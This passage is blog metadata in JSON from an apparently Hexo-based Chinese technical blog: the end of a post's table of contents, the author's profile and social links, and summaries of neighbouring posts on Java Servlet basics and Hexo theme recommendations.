class=\"toc-text\">漏洞修复</span></a></li></ol></li></ol>","author":{"name":"Akpigs","slug":"blog-author","avatar":"https://img1.imgtp.com/2022/12/28/m2fD4XcB.jpg","link":"/","description":"Sharp tools make good work, 玉不琢，不成器；人不学，不知道。","socials":{"github":"https://github.com/akpigs","twitter":"https://twitter.com/EmilyLe443","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://akpigs.blog.csdn.net/","juejin":"","customs":{"discord":{"icon":"/svg/discord.svg","link":"https://discord.gg/vS7yaWgW"},"bilibili":{"icon":"/svg/bilibili.svg","link":"https://www.bilibili.com"},"facebook":{"icon":"/svg/facebook.svg","link":"https://facebook.com"}}}},"mapped":true,"prev_post":{"title":"Servlet基础","uid":"8badacccd885f5f014e6790202a79164","slug":"Servlet基础","date":"2021-11-21T12:49:47.000Z","updated":"2022-12-30T15:22:48.033Z","comments":true,"path":"api/articles/Servlet基础.json","keywords":null,"cover":"https://img1.imgtp.com/2022/12/30/DbFoXsSB.jpg","text":"Servlet基础概念 Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。 使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"Java基础","slug":"Java基础","count":1,"path":"api/categories/Java基础.json"}],"tags":[{"name":"Java基础","slug":"Java基础","count":1,"path":"api/tags/Java基础.json"}],"author":{"name":"Akpigs","slug":"blog-author","avatar":"https://img1.imgtp.com/2022/12/28/m2fD4XcB.jpg","link":"/","description":"Sharp tools make good work, 玉不琢，不成器；人不学，不知道。","socials":{"github":"https://github.com/akpigs","twitter":"https://twitter.com/EmilyLe443","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://akpigs.blog.csdn.net/","juejin":"","customs":{"discord":{"icon":"/svg/discord.svg","link":"https://discord.gg/vS7yaWgW"},"bilibili":{"icon":"/svg/bilibili.svg","link":"https://www.bilibili.com"},"facebook":{"icon":"/svg/facebook.svg","link":"https://facebook.com"}}}}},"next_post":{"title":"主题推荐","uid":"66b65759df9f8ae35f6c9a2b2a4db094","slug":"Hexo主题推荐","date":"2021-06-22T14:28:13.000Z","updated":"2022-12-31T16:17:52.849Z","comments":true,"path":"api/articles/Hexo主题推荐.json","keywords":null,"cover":"https://img1.imgtp.com/2022/12/30/lFCFiGOy.jpg","text":"不错的Hexo主题推荐vuepress-aurora：vuepress-theme-aurora 是一款基于 Vuepress2 的博客主题，将本地 Markdown 文件解析成静态 html 页面，作为博客文章。搭配 说说，时间轴，文章分类，评论，友情链接，相册，音乐播放器 等...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"资源推荐","slug":"资源推荐","count":1,"path":"api/tags/资源推荐.json"}],"author":{"name":"Akpigs","slug":"blog-author","avatar":"https://img1.imgtp.com/2022/12/28/m2fD4XcB.jpg","link":"/","description":"Sharp tools make good work, 玉不琢，不成器；人不学，不知道。","socials":{"github":"https://github.com/akpigs","twitter":"https://twitter.com/EmilyLe443","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://akpigs.blog.csdn.net/","juejin":"","customs":{"discord":{"icon":"/svg/discord.svg","link":"https://discord.gg/vS7yaWgW"},"bilibili":{"icon":"/svg/bilibili.svg","link":"https://www.bilibili.com"},"facebook":{"icon":"/svg/facebook.svg","link":"https://facebook.com"}}}}}}